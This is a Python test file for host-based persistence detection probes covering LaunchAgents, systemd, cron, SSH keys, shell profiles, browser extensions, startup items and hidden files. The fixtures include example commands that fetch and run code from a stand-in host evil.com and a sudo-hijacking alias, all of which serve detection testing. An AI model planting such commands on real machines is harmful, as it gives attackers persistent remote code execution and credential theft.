#!/usr/bin/env python3
"""Tests for PersistenceGuard micro-probes."""

import time

import pytest

from amoskys.agents.common.probes import ProbeContext, Severity
from amoskys.agents.persistence.probes import (
    BrowserExtensionPersistenceProbe,
    CronJobPersistenceProbe,
    HiddenFilePersistenceProbe,
    LaunchAgentDaemonProbe,
    PersistenceChange,
    PersistenceChangeType,
    PersistenceEntry,
    SSHKeyBackdoorProbe,
    ShellProfileHijackProbe,
    StartupFolderLoginItemProbe,
    SystemdServicePersistenceProbe,
    create_persistence_probes,
)


class TestPersistenceProbes:
    """Test suite for PersistenceGuard probes."""

    def test_create_persistence_probes(self):
        """Test probe factory creates all 8 probes."""
        probes = create_persistence_probes()
        assert len(probes) == 8

        probe_names = [p.name for p in probes]
        assert "launchd_persistence" in probe_names
        assert "systemd_persistence" in probe_names
        assert "cron_persistence" in probe_names
        assert "ssh_key_backdoor" in probe_names
        assert "shell_profile_hijack" in probe_names
        assert "browser_extension_persistence" in probe_names
        assert "startup_folder_login_item" in probe_names
        assert "hidden_file_persistence" in probe_names

    def test_launchd_created_suspicious_command(self):
        """Test detection of new LaunchAgent with suspicious command."""
        probe = LaunchAgentDaemonProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="com.evil.backdoor",
            mechanism_type="LAUNCH_AGENT",
            user="alice",
            path="/Users/alice/Library/LaunchAgents/com.evil.backdoor.plist",
            command="/bin/bash",
            args="-c curl http://evil.com/payload | sh",
            enabled=True,
            hash="a" * 64,
            metadata={},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="com.evil.backdoor",
                mechanism_type="LAUNCH_AGENT",
                change_type=PersistenceChangeType.CREATED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_launchd_created"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["mechanism"] == "LAUNCH_AGENT"
        assert "suspicious" in events[0].data["reason"].lower()

    def test_launchd_modified(self):
        """Test detection of LaunchAgent modification."""
        probe = LaunchAgentDaemonProbe()
        now_ns = int(time.time() * 1e9)

        old_entry = PersistenceEntry(
            id="com.example.service",
            mechanism_type="LAUNCH_DAEMON",
            user="root",
            path="/Library/LaunchDaemons/com.example.service.plist",
            command="/usr/bin/legitimate",
            args="",
            enabled=True,
            hash="a" * 64,
            metadata={},
            last_seen_ns=now_ns - 1000000000,
        )

        new_entry = PersistenceEntry(
            id="com.example.service",
            mechanism_type="LAUNCH_DAEMON",
            user="root",
            path="/Library/LaunchDaemons/com.example.service.plist",
            command="/tmp/evil.sh",
            args="",
            enabled=True,
            hash="b" * 64,
            metadata={},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="com.example.service",
                mechanism_type="LAUNCH_DAEMON",
                change_type=PersistenceChangeType.MODIFIED,
                old_entry=old_entry,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_launchd_modified"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["new_command"] == "/tmp/evil.sh"

    def test_systemd_service_created(self):
        """Test detection of new systemd service."""
        probe = SystemdServicePersistenceProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="malware.service",
            mechanism_type="SYSTEMD_SERVICE",
            user="root",
            path="/etc/systemd/system/malware.service",
            command="/usr/bin/python3 -c 'import socket'",
            args="",
            enabled=True,
            hash="a" * 64,
            metadata={},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="malware.service",
                mechanism_type="SYSTEMD_SERVICE",
                change_type=PersistenceChangeType.CREATED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_systemd_service_created"
        assert events[0].severity == Severity.HIGH
        assert "python" in events[0].data["command"]

    def test_systemd_service_enabled_disabled(self):
        """Test detection of systemd service enabled/disabled."""
        probe = SystemdServicePersistenceProbe()
        now_ns = int(time.time() * 1e9)

        entry = PersistenceEntry(
            id="example.service",
            mechanism_type="SYSTEMD_SERVICE",
            user="root",
            path="/etc/systemd/system/example.service",
            command="/usr/bin/example",
            args="",
            enabled=True,
            hash="a" * 64,
            metadata={},
            last_seen_ns=now_ns,
        )

        # Test ENABLED
        changes = [
            PersistenceChange(
                entry_id="example.service",
                mechanism_type="SYSTEMD_SERVICE",
                change_type=PersistenceChangeType.ENABLED,
                old_entry=None,
                new_entry=entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_systemd_service_enabled"
        assert events[0].severity == Severity.MEDIUM

        # Test DISABLED
        changes = [
            PersistenceChange(
                entry_id="example.service",
                mechanism_type="SYSTEMD_SERVICE",
                change_type=PersistenceChangeType.DISABLED,
                old_entry=entry,
                new_entry=None,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_systemd_service_disabled"
        assert events[0].severity == Severity.INFO

    def test_cron_reboot_suspicious(self):
        """Test detection of @reboot cron with suspicious command."""
        probe = CronJobPersistenceProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="@reboot_backdoor",
            mechanism_type="CRON_JOB",
            user="root",
            path="/etc/crontab",
            command="curl http://evil.com/shell.sh | bash",
            args="",
            enabled=True,
            hash="a" * 64,
            metadata={"schedule": "@reboot"},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="@reboot_backdoor",
                mechanism_type="CRON_JOB",
                change_type=PersistenceChangeType.CREATED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_cron_created"
        assert events[0].severity == Severity.HIGH
        assert "@reboot" in events[0].data["reason"].lower()

    def test_cron_modified(self):
        """Test detection of cron job modification."""
        probe = CronJobPersistenceProbe()
        now_ns = int(time.time() * 1e9)

        old_entry = PersistenceEntry(
            id="backup_job",
            mechanism_type="CRON_JOB",
            user="root",
            path="/etc/cron.d/backup",
            command="/usr/bin/backup.sh",
            args="",
            enabled=True,
            hash="a" * 64,
            metadata={"schedule": "0 2 * * *"},
            last_seen_ns=now_ns - 1000000000,
        )

        new_entry = PersistenceEntry(
            id="backup_job",
            mechanism_type="CRON_JOB",
            user="root",
            path="/etc/cron.d/backup",
            command="/tmp/backdoor.sh",
            args="",
            enabled=True,
            hash="b" * 64,
            metadata={"schedule": "0 2 * * *"},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="backup_job",
                mechanism_type="CRON_JOB",
                change_type=PersistenceChangeType.MODIFIED,
                old_entry=old_entry,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_cron_modified"
        assert events[0].severity == Severity.HIGH
        assert "/tmp/" in events[0].data["new_command"]

    def test_ssh_key_added_root(self):
        """Test detection of SSH key added for root account."""
        probe = SSHKeyBackdoorProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="root_authorized_key_1",
            mechanism_type="SSH_AUTHORIZED_KEY",
            user="root",
            path="/root/.ssh/authorized_keys",
            command=None,
            args=None,
            enabled=True,
            hash="a" * 64,
            metadata={"has_forced_command": False},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="root_authorized_key_1",
                mechanism_type="SSH_AUTHORIZED_KEY",
                change_type=PersistenceChangeType.CREATED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_ssh_key_added"
        assert events[0].severity == Severity.CRITICAL
        assert events[0].data["user"] == "root"

    def test_ssh_key_added_forced_command(self):
        """Test detection of SSH key with forced command."""
        probe = SSHKeyBackdoorProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="alice_authorized_key_2",
            mechanism_type="SSH_AUTHORIZED_KEY",
            user="alice",
            path="/home/alice/.ssh/authorized_keys",
            command=None,
            args=None,
            enabled=True,
            hash="b" * 64,
            metadata={"has_forced_command": True},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="alice_authorized_key_2",
                mechanism_type="SSH_AUTHORIZED_KEY",
                change_type=PersistenceChangeType.CREATED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_ssh_key_added"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["forced_command"] is True

    def test_shell_profile_hijack_alias_sudo(self):
        """Test detection of sudo alias override in shell profile."""
        probe = ShellProfileHijackProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="/home/bob/.bashrc",
            mechanism_type="SHELL_PROFILE",
            user="bob",
            path="/home/bob/.bashrc",
            command="alias sudo='/tmp/fake_sudo'",
            args=None,
            enabled=True,
            hash="a" * 64,
            metadata={},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="/home/bob/.bashrc",
                mechanism_type="SHELL_PROFILE",
                change_type=PersistenceChangeType.MODIFIED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_shell_profile_modified"
        assert events[0].severity == Severity.HIGH
        assert "alias" in events[0].data["suspicious_patterns"]

    def test_shell_profile_hijack_curl_eval(self):
        """Test detection of curl | eval in shell profile."""
        probe = ShellProfileHijackProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="/home/charlie/.zshrc",
            mechanism_type="SHELL_PROFILE",
            user="charlie",
            path="/home/charlie/.zshrc",
            command="eval $(curl -s http://evil.com/payload.sh)",
            args=None,
            enabled=True,
            hash="b" * 64,
            metadata={},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="/home/charlie/.zshrc",
                mechanism_type="SHELL_PROFILE",
                change_type=PersistenceChangeType.MODIFIED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_shell_profile_modified"
        assert events[0].severity == Severity.HIGH
        assert "eval" in events[0].data["suspicious_patterns"]

    def test_browser_extension_dangerous_permissions(self):
        """Test detection of browser extension with dangerous permissions."""
        probe = BrowserExtensionPersistenceProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="chrome_ext_12345",
            mechanism_type="BROWSER_EXTENSION",
            user="alice",
            path="/home/alice/.config/google-chrome/Default/Extensions/12345",
            command=None,
            args=None,
            enabled=True,
            hash="a" * 64,
            metadata={
                "browser": "chrome",
                "name": "Suspicious Extension",
                "permissions": "tabs,webRequest,webRequestBlocking,<all_urls>",
                "unknown_publisher": True,
            },
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="chrome_ext_12345",
                mechanism_type="BROWSER_EXTENSION",
                change_type=PersistenceChangeType.CREATED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_browser_extension_installed"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["unknown_publisher"] is True
        assert "webRequest" in events[0].data["permissions"]

    def test_startup_item_suspicious_path(self):
        """Test detection of startup item with suspicious path."""
        probe = StartupFolderLoginItemProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="malware.desktop",
            mechanism_type="STARTUP_ITEM",
            user="bob",
            path="/home/bob/.config/autostart/malware.desktop",
            command="/tmp/evil_script.sh",
            args="",
            enabled=True,
            hash="a" * 64,
            metadata={},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="malware.desktop",
                mechanism_type="STARTUP_ITEM",
                change_type=PersistenceChangeType.CREATED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_startup_item_created"
        assert events[0].severity == Severity.HIGH
        assert "/tmp/" in events[0].data["command"]

    def test_hidden_file_executable(self):
        """Test detection of hidden executable file."""
        probe = HiddenFilePersistenceProbe()
        now_ns = int(time.time() * 1e9)

        new_entry = PersistenceEntry(
            id="/tmp/.hidden_backdoor",
            mechanism_type="HIDDEN_FILE_PERSISTENCE",
            user="root",
            path="/tmp/.hidden_backdoor",
            command=None,
            args=None,
            enabled=True,
            hash="a" * 64,
            metadata={"is_executable": True, "referenced_by": "cron"},
            last_seen_ns=now_ns,
        )

        changes = [
            PersistenceChange(
                entry_id="/tmp/.hidden_backdoor",
                mechanism_type="HIDDEN_FILE_PERSISTENCE",
                change_type=PersistenceChangeType.CREATED,
                old_entry=None,
                new_entry=new_entry,
                timestamp_ns=now_ns,
            )
        ]

        context = ProbeContext(
            device_id="test-device",
            agent_name="test-agent",
            shared_data={"persistence_changes": changes},
        )
        events = probe.scan(context)

        assert len(events) == 1
        assert events[0].event_type == "persistence_hidden_loader_created"
        assert events[0].severity == Severity.HIGH
        assert events[0].data["is_executable"] is True

    def test_probe_mitre_coverage(self):
        """Test that all probes have MITRE technique mappings."""
        probes = create_persistence_probes()

        for probe in probes:
            assert len(probe.mitre_techniques) > 0, f"{probe.name} missing MITRE techniques"
            assert len(probe.mitre_tactics) > 0, f"{probe.name} missing MITRE tactics"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
